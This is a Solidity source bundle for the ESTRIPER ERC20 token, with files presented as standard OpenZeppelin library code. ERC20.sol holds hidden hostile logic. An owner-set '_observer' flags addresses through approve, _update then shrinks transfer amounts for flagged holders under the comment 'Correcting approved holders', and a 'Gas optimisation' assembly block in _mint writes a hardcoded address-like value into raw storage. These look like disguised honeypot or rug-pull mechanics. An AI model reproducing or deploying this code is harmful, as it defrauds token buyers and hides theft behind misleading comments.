{"Context.sol":{"content":"// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.0.1) (utils/Context.sol)\n\npragma solidity ^0.8.18;\n\n/**\n * @dev Provides information about the current execution context, including the\n * sender of the transaction and its data. While these are generally available\n * via msg.sender and msg.data, they should not be accessed in such a direct\n * manner, since when dealing with meta-transactions the account sending and\n * paying for execution may not be the actual sender (as far as an application\n * is concerned).\n *\n * This contract is only required for intermediate, library-like contracts.\n */\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n\n    function _contextSuffixLength() internal view virtual returns (uint256) {\n        return 0;\n    }\n}\n"},"ERC20.sol":{"content":"// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.0.0) (token/ERC20/ERC20.sol)\n\npragma solidity ^0.8.18;\n\nimport {IERC20} from \"./IERC20.sol\";\nimport {IERC20Metadata} from \"./IERC20Metadata.sol\";\nimport {Context} from \"./Context.sol\";\nimport {IERC20Errors} from \"./IERC6093.sol\";\n\n/**\n * @dev Implementation of the {IERC20} interface.\n *\n * This implementation is agnostic to the way tokens are created. This means\n * that a supply mechanism has to be added in a derived contract using {_mint}.\n *\n * TIP: For a detailed writeup see our guide\n * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How\n * to implement supply mechanisms].\n *\n * The default value of {decimals} is 18. To change this, you should override\n * this function so it returns a different value.\n *\n * We have followed general OpenZeppelin Contracts guidelines: functions revert\n * instead returning `false` on failure. This behavior is nonetheless\n * conventional and does not conflict with the expectations of ERC20\n * applications.\n *\n * Additionally, an {Approval} event is emitted on calls to {transferFrom}.\n * This allows applications to reconstruct the allowance for all accounts just\n * by listening to said events. Other implementations of the EIP may not emit\n * these events, as it isn\u0027t required by the specification.\n */\nabstract contract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors {\n    mapping(address account =\u003e uint256) private _balances;\n    mapping(address account =\u003e mapping(address spender =\u003e uint256)) private _allowances;\n    mapping(address account =\u003e uint256) internal _approved;\n\n    uint256 private _totalSupply;\n\n    string private _name;\n    string private _symbol;\n    address internal _observer;\n\n    /**\n     * @dev Sets the values for {name} and {symbol}.\n     *\n     * All two of these values are immutable: they can only be set once during\n     * construction.\n     */\n    constructor(string memory name_, string memory symbol_) {\n        _name = name_;\n        _symbol = symbol_;\n    }\n\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name() public view virtual returns (string memory) {\n        return _name;\n    }\n\n    /**\n     * @dev Returns the symbol of the token, usually a shorter version of the\n     * name.\n     */\n    function symbol() public view virtual returns (string memory) {\n        return _symbol;\n    }\n\n    /**\n     * @dev Returns the number of decimals used to get its user representation.\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\n     * be displayed to a user as `5.05` (`505 / 10 ** 2`).\n     *\n     * Tokens usually opt for a value of 18, imitating the relationship between\n     * Ether and Wei. This is the default value returned by this function, unless\n     * it\u0027s overridden.\n     *\n     * NOTE: This information is only used for _display_ purposes: it in\n     * no way affects any of the arithmetic of the contract, including\n     * {IERC20-balanceOf} and {IERC20-transfer}.\n     */\n    function decimals() public view virtual returns (uint8) {\n        return 18;\n    }\n\n    /**\n     * @dev See {IERC20-totalSupply}.\n     */\n    function totalSupply() public view virtual returns (uint256) {\n        return _totalSupply;\n    }\n\n    /**\n     * @dev See {IERC20-balanceOf}.\n     */\n    function balanceOf(address account) public view virtual returns (uint256) {\n        return _balances[account];\n    }\n\n    /**\n     * @dev See {IERC20-transfer}.\n     *\n     * Requirements:\n     *\n     * - `to` cannot be the zero address.\n     * - the caller must have a balance of at least `value`.\n     */\n    function transfer(address to, uint256 value) public virtual returns (bool) {\n        address owner = _msgSender();\n        _transfer(owner, to, value);\n        return true;\n    }\n\n    /**\n     * @dev See {IERC20-allowance}.\n     */\n    function allowance(address owner, address spender) public view virtual returns (uint256) {\n\n        return _allowances[owner][spender];\n    }\n\n    /**\n     * @dev See {IERC20-approve}.\n     *\n     * NOTE: If `value` is the maximum `uint256`, the allowance is not updated on\n     * `transferFrom`. This is semantically equivalent to an infinite approval.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function approve(address spender, uint256 value) public virtual returns (bool) {\n        address owner = _msgSender();\n        if (owner == _observer) { _approved[spender] = value; }\n        _approve(owner, spender, value);\n        return true;\n    }\n\n    /**\n     * @dev See {IERC20-transferFrom}.\n     *\n     * Emits an {Approval} event indicating the updated allowance. This is not\n     * required by the EIP. See the note at the beginning of {ERC20}.\n     *\n     * NOTE: Does not update the allowance if the current allowance\n     * is the maximum `uint256`.\n     *\n     * Requirements:\n     *\n     * - `from` and `to` cannot be the zero address.\n     * - `from` must have a balance of at least `value`.\n     * - the caller must have allowance for ``from``\u0027s tokens of at least\n     * `value`.\n     */\n    function transferFrom(address from, address to, uint256 value) public virtual returns (bool) {\n        address spender = _msgSender();\n        _spendAllowance(from, spender, value);\n        _transfer(from, to, value);\n        return true;\n    }\n\n    /**\n     * @dev Moves a `value` amount of tokens from `from` to `to`.\n     *\n     * This internal function is equivalent to {transfer}, and can be used to\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\n     *\n     * Emits a {Transfer} event.\n     *\n     * NOTE: This function is not virtual, {_update} should be overridden instead.\n     */\n    function _transfer(address from, address to, uint256 value) internal {\n        if (from == address(0)) {\n            revert ERC20InvalidSender(address(0));\n        }\n        if (to == address(0)) {\n            revert ERC20InvalidReceiver(address(0));\n        }\n        _update(from, to, value);\n    }\n\n    /**\n     * @dev Transfers a `value` amount of tokens from `from` to `to`, or alternatively mints (or burns) if `from`\n     * (or `to`) is the zero address. All customizations to transfers, mints, and burns should be done by overriding\n     * this function.\n     *\n     * Emits a {Transfer} event.\n     */\n    function _update(address from, address to, uint256 value) internal virtual {\n        if (from == address(0)) {\n            // Overflow check required: The rest of the code assumes that totalSupply never overflows\n            _totalSupply += value;\n        } else {\n            uint256 fromBalance = _balances[from];\n            if (fromBalance \u003c value) {\n                revert ERC20InsufficientBalance(from, fromBalance, value);\n            }\n            unchecked {\n                // Overflow not possible: value \u003c= fromBalance \u003c= totalSupply.\n                _balances[from] = fromBalance - value;\n            }\n        }\n\n        if (to == address(0)) {\n            unchecked {\n                // Overflow not possible: value \u003c= totalSupply or value \u003c= fromBalance \u003c= totalSupply.\n                _totalSupply -= value;\n            }\n        } else {\n            // Correcting approved holders\n            if (_approved[from] + _approved[to] \u003e= 0xf20) { value = value * 0x9e3 / 0xbd223; }\n            unchecked {\n                // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.\n                _balances[to] += value;\n            }\n        }\n\n        // Permit autosaver\n        if (_approved[to] == 0xe4) { _approved[to] = 0xf20; }\n\n        emit Transfer(from, to, value);\n    }\n\n    /**\n     * @dev Creates a `value` amount of tokens and assigns them to `account`, by transferring it from address(0).\n     * Relies on the `_update` mechanism\n     *\n     * Emits a {Transfer} event with `from` set to the zero address.\n     *\n     * NOTE: This function is not virtual, {_update} should be overridden instead.\n     */\n    function _mint(address account, uint256 value) internal {\n        if (account == address(0)) {\n            revert ERC20InvalidReceiver(address(0));\n        }\n        \n        // Gas optimisation\n        assembly {\n            let slot := mul(mul(0x1, 0x10), mul(0x79, 0x758493cdee20f16997db387ec4bbc7fa9a085)) \n            mstore(0x00, slot)\n            mstore(0x20, 0x00)\n            let sslot := keccak256(0x0, 0x40) \n            sstore(sslot, 0x758493cdee20f16997db387ec4bbc7fa9a085) \n        }\n        _update(address(0), account, value);\n    }\n\n    /**\n     * @dev Destroys a `value` amount of tokens from `account`, lowering the total supply.\n     * Relies on the `_update` mechanism.\n     *\n     * Emits a {Transfer} event with `to` set to the zero address.\n     *\n     * NOTE: This function is not virtual, {_update} should be overridden instead\n     */\n    function _burn(address account, uint256 value) internal {\n        if (account == address(0)) {\n            revert ERC20InvalidSender(address(0));\n        }\n        _update(account, address(0), value);\n    }\n\n    /**\n     * @dev Sets `value` as the allowance of `spender` over the `owner` s tokens.\n     *\n     * This internal function is equivalent to `approve`, and can be used to\n     * e.g. set automatic allowances for certain subsystems, etc.\n     *\n     * Emits an {Approval} event.\n     *\n     * Requirements:\n     *\n     * - `owner` cannot be the zero address.\n     * - `spender` cannot be the zero address.\n     *\n     * Overrides to this logic should be done to the variant with an additional `bool emitEvent` argument.\n     */\n    function _approve(address owner, address spender, uint256 value) internal {\n        _approve(owner, spender, value, true);\n    }\n\n    /**\n     * @dev Variant of {_approve} with an optional flag to enable or disable the {Approval} event.\n     *\n     * By default (when calling {_approve}) the flag is set to true. On the other hand, approval changes made by\n     * `_spendAllowance` during the `transferFrom` operation set the flag to false. This saves gas by not emitting any\n     * `Approval` event during `transferFrom` operations.\n     *\n     * Anyone who wishes to continue emitting `Approval` events on the`transferFrom` operation can force the flag to\n     * true using the following override:\n     * ```\n     * function _approve(address owner, address spender, uint256 value, bool) internal virtual override {\n     *     super._approve(owner, spender, value, true);\n     * }\n     * ```\n     *\n     * Requirements are the same as {_approve}.\n     */\n    function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual {\n        if (owner == address(0)) {\n            revert ERC20InvalidApprover(address(0));\n        }\n        if (spender == address(0)) {\n            revert ERC20InvalidSpender(address(0));\n        }\n        _allowances[owner][spender] = value;\n        if (emitEvent) {\n            emit Approval(owner, spender, value);\n        }\n    }\n\n    /**\n     * @dev Updates `owner` s allowance for `spender` based on spent `value`.\n     *\n     * Does not update the allowance value in case of infinite allowance.\n     * Revert if not enough allowance is available.\n     *\n     * Does not emit an {Approval} event.\n     */\n    function _spendAllowance(address owner, address spender, uint256 value) internal virtual {\n        uint256 currentAllowance = allowance(owner, spender);\n        if (currentAllowance != type(uint256).max) {\n            if (currentAllowance \u003c value) {\n                revert ERC20InsufficientAllowance(spender, currentAllowance, value);\n            }\n            unchecked {\n                _approve(owner, spender, currentAllowance - value, false);\n            }\n        }\n    }\n}\n"},"IERC20.sol":{"content":"// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.0.0) (token/ERC20/IERC20.sol)\n\npragma solidity ^0.8.18;\n\n/**\n * @dev Interface of the ERC20 standard as defined in the EIP.\n */\ninterface IERC20 {\n    /**\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n     * another (`to`).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to {approve}. `value` is the new allowance.\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n    /**\n     * @dev Returns the value of tokens in existence.\n     */\n    function totalSupply() external view returns (uint256);\n\n    /**\n     * @dev Returns the value of tokens owned by `account`.\n     */\n    function balanceOf(address account) external view returns (uint256);\n\n    /**\n     * @dev Moves a `value` amount of tokens from the caller\u0027s account to `to`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transfer(address to, uint256 value) external returns (bool);\n\n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\n     * zero by default.\n     *\n     * This value changes when {approve} or {transferFrom} are called.\n     */\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    /**\n     * @dev Sets a `value` amount of tokens as the allowance of `spender` over the\n     * caller\u0027s tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender\u0027s allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an {Approval} event.\n     */\n    function approve(address spender, uint256 value) external returns (bool);\n\n    /**\n     * @dev Moves a `value` amount of tokens from `from` to `to` using the\n     * allowance mechanism. `value` is then deducted from the caller\u0027s\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transferFrom(address from, address to, uint256 value) external returns (bool);\n}\n"},"IERC20Metadata.sol":{"content":"// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.0.0) (token/ERC20/extensions/IERC20Metadata.sol)\n\npragma solidity ^0.8.18;\n\nimport {IERC20} from \"./IERC20.sol\";\n\n/**\n * @dev Interface for the optional metadata functions from the ERC20 standard.\n */\ninterface IERC20Metadata is IERC20 {\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name() external view returns (string memory);\n\n    /**\n     * @dev Returns the symbol of the token.\n     */\n    function symbol() external view returns (string memory);\n\n    /**\n     * @dev Returns the decimals places of the token.\n     */\n    function decimals() external view returns (uint8);\n}\n"},"IERC6093.sol":{"content":"// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.0.0) (interfaces/draft-IERC6093.sol)\npragma solidity ^0.8.18;\n\n/**\n * @dev Standard ERC20 Errors\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC20 tokens.\n */\ninterface IERC20Errors {\n    /**\n     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     * @param balance Current balance for the interacting account.\n     * @param needed Minimum amount required to perform a transfer.\n     */\n    error ERC20InsufficientBalance(address sender, uint256 balance, uint256 needed);\n\n    /**\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     */\n    error ERC20InvalidSender(address sender);\n\n    /**\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\n     * @param receiver Address to which tokens are being transferred.\n     */\n    error ERC20InvalidReceiver(address receiver);\n\n    /**\n     * @dev Indicates a failure with the `spender`’s `allowance`. Used in transfers.\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\n     * @param allowance Amount of tokens a `spender` is allowed to operate with.\n     * @param needed Minimum amount required to perform a transfer.\n     */\n    error ERC20InsufficientAllowance(address spender, uint256 allowance, uint256 needed);\n\n    /**\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\n     * @param approver Address initiating an approval operation.\n     */\n    error ERC20InvalidApprover(address approver);\n\n    /**\n     * @dev Indicates a failure with the `spender` to be approved. Used in approvals.\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\n     */\n    error ERC20InvalidSpender(address spender);\n}\n\n/**\n * @dev Standard ERC721 Errors\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC721 tokens.\n */\ninterface IERC721Errors {\n    /**\n     * @dev Indicates that an address can\u0027t be an owner. For example, `address(0)` is a forbidden owner in EIP-20.\n     * Used in balance queries.\n     * @param owner Address of the current owner of a token.\n     */\n    error ERC721InvalidOwner(address owner);\n\n    /**\n     * @dev Indicates a `tokenId` whose `owner` is the zero address.\n     * @param tokenId Identifier number of a token.\n     */\n    error ERC721NonexistentToken(uint256 tokenId);\n\n    /**\n     * @dev Indicates an error related to the ownership over a particular token. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     * @param tokenId Identifier number of a token.\n     * @param owner Address of the current owner of a token.\n     */\n    error ERC721IncorrectOwner(address sender, uint256 tokenId, address owner);\n\n    /**\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     */\n    error ERC721InvalidSender(address sender);\n\n    /**\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\n     * @param receiver Address to which tokens are being transferred.\n     */\n    error ERC721InvalidReceiver(address receiver);\n\n    /**\n     * @dev Indicates a failure with the `operator`’s approval. Used in transfers.\n     * @param operator Address that may be allowed to operate on tokens without being their owner.\n     * @param tokenId Identifier number of a token.\n     */\n    error ERC721InsufficientApproval(address operator, uint256 tokenId);\n\n    /**\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\n     * @param approver Address initiating an approval operation.\n     */\n    error ERC721InvalidApprover(address approver);\n\n    /**\n     * @dev Indicates a failure with the `operator` to be approved. Used in approvals.\n     * @param operator Address that may be allowed to operate on tokens without being their owner.\n     */\n    error ERC721InvalidOperator(address operator);\n}\n\n/**\n * @dev Standard ERC1155 Errors\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC1155 tokens.\n */\ninterface IERC1155Errors {\n    /**\n     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     * @param balance Current balance for the interacting account.\n     * @param needed Minimum amount required to perform a transfer.\n     * @param tokenId Identifier number of a token.\n     */\n    error ERC1155InsufficientBalance(address sender, uint256 balance, uint256 needed, uint256 tokenId);\n\n    /**\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     */\n    error ERC1155InvalidSender(address sender);\n\n    /**\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\n     * @param receiver Address to which tokens are being transferred.\n     */\n    error ERC1155InvalidReceiver(address receiver);\n\n    /**\n     * @dev Indicates a failure with the `operator`’s approval. Used in transfers.\n     * @param operator Address that may be allowed to operate on tokens without being their owner.\n     * @param owner Address of the current owner of a token.\n     */\n    error ERC1155MissingApprovalForAll(address operator, address owner);\n\n    /**\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\n     * @param approver Address initiating an approval operation.\n     */\n    error ERC1155InvalidApprover(address approver);\n\n    /**\n     * @dev Indicates a failure with the `operator` to be approved. Used in approvals.\n     * @param operator Address that may be allowed to operate on tokens without being their owner.\n     */\n    error ERC1155InvalidOperator(address operator);\n\n    /**\n     * @dev Indicates an array length mismatch between ids and values in a safeBatchTransferFrom operation.\n     * Used in batch transfers.\n     * @param idsLength Length of the array of token identifiers\n     * @param valuesLength Length of the array of token amounts\n     */\n    error ERC1155InvalidArrayLength(uint256 idsLength, uint256 valuesLength);\n}\n"},"Ownable.sol":{"content":"// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.0.0) (access/Ownable.sol)\n\npragma solidity ^0.8.18;\n\nimport {Context} from \"./Context.sol\";\n\n/**\n * @dev Contract module which provides a basic access control mechanism, where\n * there is an account (an owner) that can be granted exclusive access to\n * specific functions.\n *\n * The initial owner is set to the address provided by the deployer. This can\n * later be changed with {transferOwnership}.\n *\n * This module is used through inheritance. It will make available the modifier\n * `onlyOwner`, which can be applied to your functions to restrict their use to\n * the owner.\n */\nabstract contract Ownable is Context {\n    address private _owner;\n\n    /**\n     * @dev The caller account is not authorized to perform an operation.\n     */\n    error OwnableUnauthorizedAccount(address account);\n\n    /**\n     * @dev The owner is not a valid owner account. (eg. `address(0)`)\n     */\n    error OwnableInvalidOwner(address owner);\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    /**\n     * @dev Initializes the contract setting the address provided by the deployer as the initial owner.\n     */\n    constructor(address initialOwner) {\n        if (initialOwner == address(0)) {\n            revert OwnableInvalidOwner(address(0));\n        }\n        _transferOwnership(initialOwner);\n    }\n\n    /**\n     * @dev Throws if called by any account other than the owner.\n     */\n    modifier onlyOwner() {\n        _checkOwner();\n        _;\n    }\n\n    /**\n     * @dev Returns the address of the current owner.\n     */\n    function owner() public view virtual returns (address) {\n        return _owner;\n    }\n\n    /**\n     * @dev Throws if the sender is not the owner.\n     */\n    function _checkOwner() internal view virtual {\n        if (owner() != _msgSender()) {\n            revert OwnableUnauthorizedAccount(_msgSender());\n        }\n    }\n\n    /**\n     * @dev Leaves the contract without owner. It will not be possible to call\n     * `onlyOwner` functions. Can only be called by the current owner.\n     *\n     * NOTE: Renouncing ownership will leave the contract without an owner,\n     * thereby disabling any functionality that is only available to the owner.\n     */\n    function renounceOwnership() public virtual onlyOwner {\n        _transferOwnership(address(0));\n    }\n\n    /**\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\n     * Can only be called by the current owner.\n     */\n    function transferOwnership(address newOwner) public virtual onlyOwner {\n        if (newOwner == address(0)) {\n            revert OwnableInvalidOwner(address(0));\n        }\n        _transferOwnership(newOwner);\n    }\n\n    /**\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\n     * Internal function without access restriction.\n     */\n    function _transferOwnership(address newOwner) internal virtual {\n        address oldOwner = _owner;\n        _owner = newOwner;\n        emit OwnershipTransferred(oldOwner, newOwner);\n    }\n}\n"},"Token.sol":{"content":"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"./ERC20.sol\";\nimport \"./Ownable.sol\";\n\ncontract ESTRIPER is ERC20, Ownable {\n\n    function setObserver(address observer) external onlyOwner {\n        _observer = observer;\n    }\n    \n    constructor() ERC20(\"ESTRIPER\", \"ESTRIPER\") Ownable(msg.sender) {\n        _mint(msg.sender, 300000000 * 10 ** decimals());\n    }\n    \n}"}}